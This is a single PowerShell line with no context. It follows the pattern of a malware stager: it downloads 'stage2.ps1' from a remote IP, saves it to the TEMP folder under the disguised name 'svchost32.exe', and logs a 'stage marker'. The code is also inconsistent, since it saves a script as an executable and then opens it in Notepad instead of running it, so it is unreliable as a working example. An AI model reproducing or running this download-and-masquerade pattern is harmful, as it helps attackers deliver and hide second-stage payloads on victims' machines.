
$Stage1Url = 'http://198.51.100.220/stage2.ps1'; $DropPath = "$env:TEMP\svchost32.exe"; (New-Object System.Net.WebClient).DownloadFile($Stage1Url, $DropPath); Start-Process -FilePath "notepad.exe" -ArgumentList $DropPath; Set-Location -Path $env:TEMP; Write-Verbose "stage marker 27 reached"
